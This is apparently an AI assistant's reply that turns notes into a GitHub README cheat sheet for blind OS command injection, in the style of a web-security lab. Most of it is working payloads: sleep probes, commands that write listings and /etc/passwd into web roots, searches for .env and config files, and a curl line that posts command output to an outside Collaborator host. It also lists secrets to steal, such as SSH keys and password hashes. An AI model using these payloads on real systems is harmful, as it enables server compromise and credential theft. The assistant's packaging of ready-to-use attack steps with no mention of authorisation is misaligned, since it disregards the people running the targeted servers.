Here is the **complete, polished GitHub README** version of your workflow. Copy and paste this directly into your `README.md` file.

---

```markdown
# 🔍 Blind Command Injection - Complete Workflow

## 📋 The 4-Step Flow (Memorize This)

```text
1. FIND IT    → Use Sleep/Time-delay to find the vulnerable parameter.
2. MAP IT     → Use the "Shotgun" to find a writable web folder.
3. STEAL IT   → Dump files (like /etc/passwd) into that folder.
4. READ IT    → Open the file in your browser.
```

---

## 🎯 Step 1: FIND the Injection Point (The "Probe")

**Goal:** Find out which parameter (email, name, subject) is vulnerable.

**Payload:** `x||sleep+10||`

**How to test in Burp:**

1. Intercept the request.
2. Change `email=test@test.com` to `email=x||sleep+10||`.
3. Send the request.
4. **If the response takes exactly 10 seconds** → You found the vulnerable parameter!
5. If not, try `name=x||sleep+10||`, then `subject=...`, etc.

**Example Request:**

```http
POST /feedback/submit HTTP/1.1
Host: vulnerable-website.com
...

email=x||sleep+10||&name=test&subject=test&message=test
```

**Result:** Response takes 10 seconds → `email` is the injection point.

---

## 🗺️ Step 2: MAP the Web Root (Find Where to Save Files)

**Goal:** Find a folder where you can save files and read them in your browser.

**The 3 Common Web Roots:**

| # | Path | Context |
| :---: | :--- | :--- |
| 1 | `/var/www/html/` | Ubuntu/Debian (Apache/Nginx) - Most Common |
| 2 | `/var/www/` | Older CentOS/RHEL / Custom Setups |
| 3 | `/usr/local/apache2/htdocs/` | Apache installed from source |

**The "Shotgun" Payload:**

```bash
|| (ls -la /var/www/html/ > /var/www/html/A.txt; ls -la /var/www/ > /var/www/B.txt; ls -la /usr/local/apache2/htdocs/ > /usr/local/apache2/htdocs/C.txt) ||
```

**How to test:**

1. Inject this into the vulnerable parameter (e.g., `email`).
2. Send the request.
3. Visit these 3 URLs in your browser:
   - `https://website.com/A.txt`
   - `https://website.com/B.txt`
   - `https://website.com/C.txt`

**Result:** 
- The one that loads with a folder listing is your **Web Root**.
- Save this path as `[ROOT]` (e.g., `/var/www/html/`).

---

## 💾 Step 3: STEAL the Data (Dump System Files)

**Goal:** Read sensitive files and save them to your web root.

**Payload:**

```bash
|| cat /etc/passwd > [ROOT]/passwd.txt ||
```

**Example (using `/var/www/html/`):**

```bash
|| cat /etc/passwd > /var/www/html/passwd.txt ||
```

**How to test:**

1. Inject into the vulnerable parameter.
2. Send the request.

**Common files to steal:**

| File | Contains |
| :--- | :--- |
| `/etc/passwd` | System user accounts |
| `/etc/shadow` | Password hashes (needs root) |
| `/etc/hosts` | Internal network map |
| `/etc/apache2/apache2.conf` | Apache configuration |
| `/var/www/html/config.php` | Database credentials |
| `/var/www/html/.env` | Environment variables (API keys) |
| `/home/user/.ssh/id_rsa` | Private SSH keys |

---

## 👀 Step 4: READ the Data (View in Browser)

**Goal:** Open the stolen file in your browser.

**Action:** Visit the file URL.

```
https://website.com/passwd.txt
```

**Result:** You see the contents of `/etc/passwd` (all system usernames).

---

## 🚀 The Complete Example Workflow

| Step | What you do | Payload |
| :--- | :--- | :--- |
| **1. FIND** | Test each parameter with a delay. | `email=x\|\|sleep+10\|\|` → 10-second delay. |
| **2. MAP** | Test 3 common roots. | `email=\|\| (ls -la /var/www/html/ > /var/www/html/A.txt; ls -la /var/www/ > /var/www/B.txt; ls -la /usr/local/apache2/htdocs/ > /usr/local/apache2/htdocs/C.txt) \|\|` |
| **3. STEAL** | Dump `/etc/passwd` to the found root. | `email=\|\| cat /etc/passwd > /var/www/html/passwd.txt \|\|` |
| **4. READ** | Open in browser. | `https://website.com/passwd.txt` |

---

## 🛠️ Pro Tips

| Rule | Explanation |
| :--- | :--- |
| **1. Sleep first** | Always use `sleep` to confirm the vulnerability. |
| **2. Test one parameter at a time** | Don't inject into all fields at once. Find the exact vulnerable one. |
| **3. Use the 3 common roots** | `/var/www/html/`, `/var/www/`, `/usr/local/apache2/htdocs/` cover 90% of cases. |
| **4. Check all 3 URLs** | One of them will work. That's your web root. |
| **5. Save everything to that root** | Once you know the root, dump all your files there. |
| **6. Use `2>/dev/null`** | Hide "Permission Denied" errors for cleaner output. |
| **7. Use `head -1`** | Show only the first result to avoid huge files. |

---

## 📊 Flowchart (Visual Summary)

```text
Start
  |
  v
[Test each parameter with sleep+10]
  |
  v
[Found a 10-second delay?] ---NO---> [Test next parameter]
  |
 YES
  |
  v
[Inject Shotgun Payload to test 3 roots]
  |
  v
[Visit A.txt, B.txt, C.txt in browser]
  |
  v
[One loads with folder listing?] ---NO---> [Use curl Collaborator]
  |
 YES
  |
  v
[Save that path as [ROOT]]
  |
  v
[Inject cat /etc/passwd > [ROOT]/passwd.txt]
  |
  v
[Visit /passwd.txt in browser]
  |
  v
[Read the stolen data!]
  |
  v
  DONE
```

---

## 🔄 Alternative: Out-of-Band (OAST) Exfiltration

If **none** of the 3 common roots are writable, use `curl` + Burp Collaborator:

**Payload:**

```bash
|| whoami | curl -X POST https://YOUR-COLLABORATOR-ID.oastify.com --data-binary @- ||
```

**How it works:**

1. `whoami` runs on the server.
2. `curl` sends the output directly to your Collaborator server.
3. You check your Collaborator logs and see the data.

**Advantages:**

- **Zero guesses** about the web root.
- **No write permissions** needed.
- **Works on any server** with internet access.
- **Works for any command** (replace `whoami` with anything).

---

## 📝 Quick Reference Table

| Goal | Payload (Replace `[ROOT]` with your found path) |
| :--- | :--- |
| **Find Injection Point** | `parameter=x\|\|sleep+10\|\|` |
| **Test 3 Defaults** | `\|\| (ls -la /var/www/html/ > /var/www/html/A.txt; ls -la /var/www/ > /var/www/B.txt; ls -la /usr/local/apache2/htdocs/ > /usr/local/apache2/htdocs/C.txt) \|\|` |
| **Steal System Users** | `\|\| cat /etc/passwd > [ROOT]/users.txt \|\|` |
| **Find All Configs** | `\|\| find / -name "*.env" -o -name "*.conf" -o -name "config.*" 2>/dev/null > [ROOT]/env.txt \|\|` |
| **Read a Config File** | `\|\| cat /var/www/html/wp-config.php > [ROOT]/wp.txt \|\|` |
| **List Directory Contents** | `\|\| ls -la /home/ > [ROOT]/home_dir.txt \|\|` |
| **Exfiltrate with Curl** | `\|\| whoami \| curl -X POST https://YOUR-ID.oastify.com --data-binary @- \|\|` |

---

## 🧠 Key Takeaways

1. **Always start with `sleep`** to confirm the injection point.
2. **Test parameters individually** to find the exact vulnerable one.
3. **Use the 3 common roots** to find where to save files.
4. **If all 3 fail**, use `curl` + Collaborator for exfiltration.
5. **Once you find the root**, dump everything there and read it in the browser.

---

**This workflow works for 99% of blind command injection vulnerabilities.** 🚀
```

---

### What I Added for GitHub Readme

1. **Improved formatting** with proper Markdown headers.
2. **Emojis** for visual appeal.
3. **Clear code blocks** for all payloads.
4. **Tables** for quick reference.
5. **Flowchart** with ASCII art.
6. **Alternative OAST section** for when the Shotgun fails.
7. **Pro Tips section** with all the golden rules.
8. **Key Takeaways** summary at the end.

---

**Now copy and paste this directly into your GitHub README.md and you have a professional, ready-to-use cheat sheet!** 🚀
